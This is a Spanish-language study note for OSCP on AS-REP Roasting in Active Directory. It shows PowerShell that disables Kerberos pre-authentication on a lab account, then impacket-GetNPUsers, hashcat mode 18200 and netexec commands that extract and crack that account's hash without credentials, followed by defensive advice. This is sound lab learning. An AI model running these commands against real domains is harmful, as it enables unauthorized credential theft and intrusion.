# AS-REP Roasting — crackear cuentas sin pre-auth

> **En una frase:** una cuenta con la **pre-autenticación desactivada** hace que el KDC entregue su **AS-REP** a cualquiera que diga su nombre — sin demostrar nada. Ese AS-REP va cifrado con el **hash de la contraseña** del usuario → te lo llevas y lo **crackeas OFFLINE**. No necesitas NI UNA credencial, solo el nombre de usuario.
> Relacionado: [[kerberos-kdc]] · [[kerberoasting]] · [[ntlm]] · [[agdlp-y-bloodhound]] · [[montar-lab-ad]]

---

## La pre-autenticación (de dónde nace el fallo)
En el login normal de Kerberos (ver [[kerberos-kdc]], el paso AS-REQ/AS-REP):
```
jan ──AS-REQ──►  KDC(AS)   "soy jan, aquí va la HORA cifrada con mi hash"   ← esto es la PRE-AUTH
jan ◄──AS-REP──  KDC(AS)   "descifra bien → sabes tu pass → toma el AS-REP (con TGT)"
```
La **pre-auth** = tu cliente cifra un **timestamp** con tu hash; el KDC lo descifra con el hash que guarda. Si cuadra, sabes tu password → te manda el AS-REP. Es un **candado anti-crackeo**: te obliga a probar quién eres **antes** de recibir nada cifrado con tu hash.

## El fallo: `DONT_REQ_PREAUTH`
Existe una casilla en AD: **"No requerir autenticación previa de Kerberos"**. Con ella puesta:
> El KDC manda el **AS-REP a cualquiera** que diga el nombre de la cuenta, **sin pedir el timestamp cifrado**.

Y el AS-REP contiene un trozo **cifrado con el hash de la pass del usuario** → material crackeable regalado.

**Clave:** la pre-auth no impedía *crackear* el hash — impedía **conseguir el blob sin demostrar identidad**. Quitada → un extraño se lleva el blob solo con decir el nombre. Si la pass es débil → hashcat offline en segundos.

## ¿Por qué un admin la desactivaría?
Apps/dispositivos viejos (Linux, Unix, legacy) que no implementan bien la pre-auth de Kerberos → el admin apaga la casilla "para que funcione" → deja la puerta abierta. Suele caer en cuentas de **IT/técnicas**.

## La analogía (misma taquilla que [[kerberoasting]])
```
Normal:   enseñas el DNI (timestamp cifrado) → recepción te da la pulsera
Sin preauth: la cuenta tiene nota "a este déjenle pasar sin DNI"
          → pides "la pulsera de piotr" → te la dan cifrada con la llave de piotr
          → te la llevas y pruebas millones de llaves (hashcat) hasta abrirla
```

## Por qué es tan peligroso
| Propiedad | Por qué importa |
|---|---|
| **CERO credenciales** | Solo necesitas el **nombre** de usuario. Ni una pass. |
| **Suele ser el PRIMER ataque** | Enumeras usuarios → pruebas AS-REP a todos → el que no tenga pre-auth cae. |
| **Offline / silencioso** | Crackeo en Kali. Sin lockout (no hay login), el DC no se entera. |

---

## Montaje del escenario en el lab (lo que planté en DC01)
> Fecha: 2026-10-17 · víctima `piotr.wisniewski` (OU=IT) · pass débil **a propósito**.

```powershell
# 1. Pass débil (para que el crackeo funcione en el lab)
Set-ADAccountPassword -Identity piotr.wisniewski -Reset `
  -NewPassword (ConvertTo-SecureString "Autumn2024!" -AsPlainText -Force)

# 2. Desactivar la pre-auth (el sabotaje)
Set-ADAccountControl -Identity piotr.wisniewski -DoesNotRequirePreAuth $true

# 3. Verificar → debe salir True
Get-ADUser -Identity piotr.wisniewski -Properties DoesNotRequirePreAuth | Select Name,DoesNotRequirePreAuth
#   DoesNotRequirePreAuth : True   ✅
```

---

## El ataque real (desde Kali) — ✅ EJECUTADO (2026-10-17)
> Kali con 2 adaptadores: NAT (internet) + Internal Network `NordwindLAN` (IP estática `192.168.10.50`). DC = `192.168.10.10`. Ver [[impacket]], [[netexec]].

```bash
# SIN credenciales, probando una lista de usuarios (los conocía por ser mi lab;
# en un caso real los sacaría antes con kerbrute / RID cycling):
impacket-GetNPUsers nordwind.local/ -usersfile users.txt -no-pass \
  -dc-ip 192.168.10.10 -format hashcat -outputfile asrep.txt
```
**Salida clave:** solo `piotr.wisniewski` soltó hash; el resto →
`doesn't have UF_DONT_REQUIRE_PREAUTH set` (protegidos). Confirma la lógica:
disparas a toda la lista y **cae solo el mal configurado**.

```bash
hashcat -m 18200 asrep.txt seasons.txt --force      # → piotr : Autumn2024!
```
**Lección wordlist (importante OSCP):** `Autumn2024!` NO está en rockyou — es un
patrón *estación+año+símbolo*, no una filtración real. Se crackeó con una **wordlist
DIRIGIDA** generada a mano con ese patrón. Ver [[hashcat]].

- [x] GetNPUsers → hash `$krb5asrep$23$piotr.wisniewski@NORDWIND.LOCAL:...`
- [x] hashcat `-m 18200` → **`Autumn2024!`**
- [x] Credencial validada: `netexec smb 192.168.10.10 -u piotr.wisniewski -p 'Autumn2024!'` → `[+]`

**Modo hashcat:** `18200` = AS-REP. No confundir con `13100` (Kerberoasting).

---

## Defensa
1. **No desactivar la pre-auth** nunca, salvo necesidad crítica documentada. Es una casilla, revísala en toda la base de usuarios.
2. Si una app legacy la exige → **aislar** esa cuenta y ponerle una **pass larga y aleatoria** (incrackeable).
3. **Auditar** periódicamente qué cuentas tienen `DONT_REQ_PREAUTH` (en BloodHound sale directo).
4. **Monitorizar** Event ID **4768** (AS-REQ) con pre-auth tipo 0 / cifrado RC4.

## Dónde cae en el OSCP
Set de AD (40 pts): de los **primeros** disparos, porque no necesita credenciales. Enumeras usuarios (kerbrute / RID cycling) → `GetNPUsers.py` a la lista → si uno cae, ya tienes una credencial para empezar. 100% manual, sin Metasploit.

## Primo hermano (no confundir) — tabla comparativa
| | [[kerberoasting]] | **AS-REP Roasting** |
|---|---|---|
| Objetivo | Cuenta con **SPN** | Cuenta **sin pre-auth** |
| ¿Credenciales? | **Sí** (un user cualquiera) | **NO** (solo el nombre) |
| Qué pides | **TGS** | **AS-REP** |
| Herramienta | `GetUserSPNs.py` | `GetNPUsers.py` |
| Modo hashcat | `13100` | `18200` |
